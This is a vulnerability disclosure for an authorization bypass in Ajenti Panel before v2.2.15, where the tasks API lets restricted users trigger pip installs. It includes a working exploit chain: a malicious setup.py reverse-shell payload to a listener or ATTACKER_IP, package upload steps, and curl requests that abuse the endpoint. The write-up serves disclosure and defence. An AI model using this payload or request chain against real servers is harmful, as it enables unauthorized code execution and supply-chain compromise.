# Ajenti Panel < v2.2.15 - Authorization Bypass

**Status:** Patched

**GHSA ID:**[GHSA-73jv-44c3-j5p2](https://github.com/ajenti/ajenti/security/advisories/GHSA-73jv-44c3-j5p2)

**CVE ID:** CVE-2026-35175

**Researcher:** Nguyen Van Thien

**Severity**: 🔴 High

**CWE**: CWE-862 — Missing Authorization

**OWASP Top 10:2025**:
  - A01:2025 — Broken Access Control *(root cause: missing @authorize)*
  - A03:2025 — Software Supply Chain Failures *(attack vector: malicious PyPI package)*

**CVSS v4.0**: `AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:L/SC:L/SI:L/SA:L` — Score: **7.2 (High)**

**Repository**: `ajenti/ajenti`

**Affected Version**: < v2.2.15
**Affected Files**:
- `plugins/core/views/tasks.py` — line 15 (Missing `@authorize`)
- `plugins/plugins/tasks.py` — line 14 (No authorization in `run()`)

> **Test Environment**: Ajenti running on Linux with `users` auth provider.
> **Attacker Account**: `sinhvien` — a real OS user with uid=1001, not in sudo group, no special privileges.

---

## Summary

Ajenti Panel allows administrators to restrict each user's capabilities through a
permission system (`terminal:open`, `terminal:scripts`, `filesystem:write`, etc.).
However, the endpoint `POST /api/core/tasks/start` **lacks an `@authorize` decorator**,
allowing any authenticated user — even one fully restricted by the admin — to launch
any Task class with arbitrary arguments.

**Nature of the vulnerability**: This is an **Authorization Bypass (CWE-862)** — the
user circumvents intentionally restricted functionality. Ajenti's permission system
(carefully configured by the administrator) is entirely defeated when the user knows
how to use the Tasks API.

**Downstream consequence**: By abusing the `InstallPlugin` task (which also lacks
`@authorize` in `run()`), an attacker can trigger pip to install a malicious package,
resulting in arbitrary code execution and a reverse shell — even when
`terminal:scripts: false` and `terminal:open: false` are set.

---

## Evidence

### 1. Vulnerable Endpoint — No Authorization Check

**File**: `plugins/core/views/tasks.py` — lines 15–24

```python
@post('/api/core/tasks/start')
@endpoint(api=True)          # ← Checks authentication only
# ← MISSING: @authorize('core:tasks:manage')
def handle_api_tasks_start(self, http_context):
    data = json.loads(http_context.body.decode())
    modulename, clsname = data['cls'].rsplit('.', 1)
    module = __import__(modulename, fromlist=[''])   # Arbitrary module import
    cls = getattr(module, clsname)                  # Arbitrary class retrieval
    task = cls(self.context, *data.get('args', []), **data.get('kwargs', {}))
    self.service.start(task)
    return task.id
```

> **Root Cause**: The endpoint accepts any module and class name from user input and
> executes them without any permission check. No whitelist is enforced.

---

### 2. Gadget — InstallPlugin with User-Controlled Command Execution

**File**: `plugins/plugins/tasks.py` — lines 7–15

```python
class InstallPlugin(Task):
    name = 'Installing plugin'

    def __init__(self, context, name=None, version=None):
        Task.__init__(self, context)
        self.spec = f'ajenti.plugin.{name}=={version}'   # ← User-controlled!

    def run(self):
        # No @authorize decorator!
        subprocess.check_output([sys.executable, '-m', 'pip', 'install', self.spec])
        #                                                         ↑
        #                        self.spec is entirely attacker-controlled
```

> **Note**: `UpgradeAll` and `UnInstallPlugin` in the same file also lack `@authorize`
> in their `run()` methods.

---

### 3. Malicious Package — setup.py with Reverse Shell Payload

**Published on TestPyPI**: https://test.pypi.org/project/ajenti-plugin-nvt-poc/1.0.0/

```python
# /tmp/testpypi_pkg/setup.py
from setuptools import setup
import subprocess, os

# Reverse shell — executes when pip unpacks the package
subprocess.Popen(
    ['bash', '-c', 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'],
    stdout=open(os.devnull, 'w'),
    stderr=open(os.devnull, 'w'),
    preexec_fn=os.setsid,
    close_fds=True,
)

setup(
    name='ajenti-plugin-nvt-poc',
    version='1.0.0',
    description='Security Research PoC - Ajenti CWE-862',
    packages=[],
)
```

> **Key insight:** pip executes `setup.py` during the installation process. Any
> top-level code in `setup.py` runs immediately when pip unpacks the archive.

---

### 4. Pip Configuration — Redirecting to TestPyPI

**Used in test environment** (instead of public `pypi.org`):

```ini
# /opt/ajenti/pip.conf
[global]
index-url = https://test.pypi.org/simple/
extra-index-url = https://pypi.org/simple/
trusted-host = test.pypi.org
```

> **In a real-world attack against a production server:** No pip.conf modification
> is needed. pip defaults to `pypi.org`. The attacker only needs to publish the
> malicious package to `pypi.org` under the name `ajenti.plugin.<name>`.

---

### 5. Exploit Request — Actual Task ID

```bash
# Login to obtain session
curl -s -X POST http://localhost:8000/api/core/auth \
  -H "Content-Type: application/json" \
  -d '{"mode": "normal", "username": "sinhvien", "password": "nvt"}' \
  -c /tmp/cookie.txt
# SESSION=05c88457deef590ab6867f8cd795a0be3ccc35228e91d914f3c1c9bf17c2ffcb
```

```http
POST /api/core/tasks/start HTTP/1.1
Host: localhost:8000
Cookie: session=05c88457deef590ab6867f8cd795a0be3ccc35228e91d914f3c1c9bf17c2ffcb
Content-Type: application/json

{
    "cls": "aj.plugins.plugins.tasks.InstallPlugin",
    "kwargs": {
        "name": "nvt-poc",
        "version": "1.0.0"
    }
}
```

**Response (HTTP 200)**:
```json
"360ada0652dc07bd05dafe5d5260feb2a6091ec16e8b5d569b53c6ecb12fbed8"
```

> The spec is built as: `ajenti.plugin.nvt-poc==1.0.0` → pip searches TestPyPI
> → finds `ajenti-plugin-nvt-poc==1.0.0` → downloads and installs it.

---

### 6. Reverse Shell Received — Full Confirmation

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60856
bash: cannot set terminal process group (26303): Inappropriate ioctl for device
bash: no job control in this shell

<i-plugin-nvt-poc_ab67dcedda9d484b8238005a3a064a81$ id
uid=1001(sinhvien) gid=1001(sinhvien) groups=1001(sinhvien)

<i-plugin-nvt-poc_ab67dcedda9d484b8238005a3a064a81$ _
```

**Confirmed results:**
- Shell received from `127.0.0.1:60856`
- `uid=1001(sinhvien)` — the restricted user
- `terminal:scripts: false`, `terminal:open: false` — **completely bypassed**
- Package was fetched from the public internet (`test.pypi.org`)

> **This proves:** The attack works entirely over the internet. No server-side
> file access or prerequisites are needed. Only a valid session cookie and a
> package hosted on PyPI are required.

---

## Attack Path

The endpoint `POST /api/core/tasks/start` was designed for the Ajenti frontend to
launch background tasks (install plugins, upgrade the system, etc.). This is a
privileged operation that should only be accessible to administrators. However,
the missing `@authorize` decorator means any authenticated user can call it,
creating an **Authorization Bypass**.

**Key point**: The administrator explicitly sets `terminal:scripts=false` to prevent
users from running commands on the server. The Tasks API creates an indirect path
to achieve the exact same goal — running shell commands — without requiring any
permissions.

```
[Attacker] Logs in as 'sinhvien'
  OS user: uid=1001(sinhvien), no sudo, no special privileges
  Ajenti permissions: terminal:scripts=false, terminal:open=false
    ↓
POST /api/core/tasks/start
  {"cls": "aj.plugins.plugins.tasks.InstallPlugin",
   "kwargs": {"name": "nvt-poc", "version": "1.0.0"}}
  ← Endpoint has NO @authorize → accepted!
    ↓
handle_api_tasks_start():
  __import__('aj.plugins.plugins.tasks') → InstallPlugin
  task = InstallPlugin(context, name='nvt-poc', version='1.0.0')
  self.spec = 'ajenti.plugin.nvt-poc==1.0.0'
  task.start() → gipc.start_process() → fork child (uid=1001)
    ↓
InstallPlugin.run() [NO @authorize]:
  subprocess.check_output([python3, '-m', 'pip', 'install',
                           'ajenti.plugin.nvt-poc==1.0.0'])
    ↓
pip fetches from PyPI (or TestPyPI in this demo):
  → Finds: ajenti-plugin-nvt-poc-1.0.0.tar.gz
    ↓
pip unpacks → runs setup.py (attacker's code):
  subprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'])
    ↓
╔══════════════════════════════════════════════════╗
║  uid=1001(sinhvien) gid=1001(sinhvien)           ║
║  Reverse shell confirmed                         ║
║  terminal:scripts=false → BYPASSED               ║
║  terminal:open=false    → BYPASSED               ║
╚══════════════════════════════════════════════════╝
```

---

## Likelihood

**Medium** — Conditions required for exploitation:
1. Attacker must have a valid Ajenti account (even the most restricted one).
2. Attacker must be able to publish a package to PyPI (free account, no approval required).
3. The target server must have outbound internet access to `pypi.org` (standard in production).
4. No special Ajenti permissions are required beyond a valid session.

---

## Impact

- **Unauthorized code execution** as OS user `sinhvien` (uid=1001) — a standard system user.
- **Full bypass of the permission system**: `terminal:scripts=false`, `terminal:open=false` are completely ineffective.
- **Data exfiltration**: Attacker can read any file accessible to `sinhvien` on the OS (home directory, world-readable files, shared directories, etc.).
- **Lateral movement**: With a shell as `sinhvien`, the attacker can search for credentials, private keys, database configs, or exploit local privilege escalation vulnerabilities.
- **Persistence**: A malicious pip package installed with a post-install hook can persist long-term on the system.
- **Worst case**: If the admin misconfigures `sinhvien`'s UID to match a user with sudo privileges (e.g., uid=1000=nvt in a lab), the impact escalates to full root compromise.

---

## Assumptions

- Attacker has a valid Ajenti account (even one with no privileges whatsoever).
- Ajenti is configured with the `users` auth provider.
- The server has outbound internet access to `pypi.org` (standard for any production server).
- `/tmp` is world-writable (default on all Linux systems).

---

## Security Controls in Place (That Are Bypassed)

- Ajenti requires login before calling any API endpoint (except `auth=False` ones).
- The worker process is demoted to the user's UID after login, limiting OS-level access.
- `filesystem:write: false` prevents the attacker from writing files via the Ajenti API (but does not prevent writing to `/tmp` at the OS level).
- `terminal:scripts: false` and `terminal:open: false` are intended to block command execution — **this vulnerability bypasses both controls entirely**.

---

## Blindspots

- **No Task class whitelist**: Any Task class in the entire codebase can be invoked.
- **Unrestricted `__import__`**: The attacker can import any Python module available on the system.
- **pip configuration is not controlled**: Ajenti does not validate or lock pip configuration.
- **Worker UID is not validated**: The `uid` in `users.yml` can map to any OS user, including one with `sudo`.
- `UpgradeAll` and `UnInstallPlugin` in `plugins/plugins/tasks.py` also lack `@authorize` and are similarly exploitable.

## Reproduction Steps

```bash
# 1. Create OS user 'sinhvien' with restricted Ajenti permissions
#    users.yml: sinhvien.uid: 1001
#               terminal:scripts: false
#               terminal:open: false

# 2. Create malicious PyPI package (or use TestPyPI for testing)
mkdir /tmp/poc_pkg && cat > /tmp/poc_pkg/setup.py << 'EOF'
from setuptools import setup
import subprocess, os
subprocess.Popen(['bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'],
    stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'),
    preexec_fn=os.setsid, close_fds=True)
setup(name='ajenti.plugin.evil', version='1.0.0')
EOF
cd /tmp/poc_pkg && python3 setup.py sdist
twine upload dist/*   # Upload to pypi.org or test.pypi.org

# 3. Configure pip to use TestPyPI (not needed for real pypi.org)
sudo bash -c 'cat > /opt/ajenti/pip.conf << EOF
[global]
index-url = https://test.pypi.org/simple/
extra-index-url = https://pypi.org/simple/
EOF'

# 4. Start listener
nc -lvnp 4444

# 5. Login as sinhvien and trigger exploit
SESSION=$(curl -s -X POST http://TARGET:8000/api/core/auth \
  -H "Content-Type: application/json" \
  -d '{"mode":"normal","username":"sinhvien","password":"PASSWORD"}' \
  -c /tmp/c.txt > /dev/null && grep session /tmp/c.txt | awk '{print $7}')

curl -s -X POST http://TARGET:8000/api/core/tasks/start \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"cls":"aj.plugins.plugins.tasks.InstallPlugin",
       "kwargs":{"name":"evil","version":"1.0.0"}}'

# 6. Receive reverse shell
# uid=1001(sinhvien) gid=1001(sinhvien) groups=1001(sinhvien)
# terminal:scripts=false → BYPASSED
```

---

## Timeline

| Date | Event |
|---|---|
| 2026-03-13 21:03 | Discovered `POST /api/core/tasks/start` missing `@authorize` |
| 2026-03-13 21:08 | Confirmed multiple tasks (`UpdateLists`, `Delete`) are accepted |
| 2026-03-13 21:11 | Confirmed pip actually executes (pip cache created) |
| 2026-03-13 21:21 | Successfully built malicious package |
| 2026-03-13 21:28 | Configured `/opt/ajenti/pip.conf` with `find-links` |
| 2026-03-13 21:29 | **Authorization Bypass confirmed** — code runs as `uid=1001(sinhvien)` despite `terminal:scripts=false` |
| 2026-03-14 10:41 | Malicious package published to TestPyPI |
| 2026-03-14 10:50 | **Reverse shell received via TestPyPI vector** — full internet-based attack confirmed |
| 2026-03-14 10:54 | Confirmed bug is **NOT fixed in v2.2.13** (fix commits 93ec9bb30, 193b6e273 address a different issue) |

---

## Vendor Response & Mitigation
The Ajenti maintainer (Arnaud Kientz) was highly responsive and collaborative. The issue was mitigated by restricting dynamic imports and hardening the API endpoint.
- **Fix Commits:** 
  -[68ff2ed20654683c9dd781f2e65ef6f1cd539bf7](https://github.com/ajenti/ajenti/commit/68ff2ed20654683c9dd781f2e65ef6f1cd539bf7)
  -[20a4e3dcf5c038bbfaf9a2051bfdb48e7d952968](https://github.com/ajenti/ajenti/commit/20a4e3dcf5c038bbfaf9a2051bfdb48e7d952968)
- **Official Advisory:**[GHSA-73jv-44c3-j5p2](https://github.com/ajenti/ajenti/security/advisories/GHSA-73jv-44c3-j5p2)
